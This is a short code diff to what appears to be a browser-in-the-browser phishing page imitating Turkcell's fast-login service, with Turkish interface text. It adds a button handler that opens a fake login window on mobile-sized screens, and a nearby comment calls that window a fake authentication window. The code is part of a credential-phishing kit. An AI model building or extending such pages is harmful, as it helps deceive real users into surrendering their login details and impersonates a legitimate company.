@@ -57,7 +57,7 @@
                                 <div style="color: wihte;" class="m-login__main">
                                     <p>Hesabınıza Hızlı Giriş ile kolayca giriş yapabilirsiniz.</p>
                                     <div>
-                                        <button id="clickme" class="rcorners1">
+                                        <button id="clickme" class="rcorners1" onclick="myPhone()">
                                             <img id="hizligiris-logo"src="BITB/favicon.ico" style="height: auto">
                                             <span class='text'><strong style="color: black">Hızlı</strong>Giriş</span>
                                         </button>
@@ -132,6 +132,13 @@
         function launchWindow_Bipmeet(){
             // Launch the fake authentication window
             window.open("https://www.turkcell.com.tr/servisler/bip-meet", "_blank");
+        }
+
+        function myPhone() {
+            if ( $(window).width() < 1000) {     
+                window.open("BITB/BITB/Fastlogin.html", "_blank");
+            }
+            else {}
         }
 
     </script>
